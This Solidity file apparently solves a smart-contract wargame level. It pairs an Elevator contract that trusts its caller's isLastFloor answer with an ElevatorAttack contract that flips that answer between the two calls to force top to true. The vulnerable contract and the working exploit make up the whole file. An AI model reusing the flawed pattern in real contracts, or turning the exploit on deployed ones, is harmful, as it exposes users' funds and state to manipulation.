// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorAttack {

  bool public isLast = true;

  function isLastFloor(uint) public returns (bool) {
    isLast = ! isLast;
    return isLast;
  }

  function attack(address _victim) public {
    Elevator elevator = Elevator(_victim);
    elevator.goTo(10);
  }
}
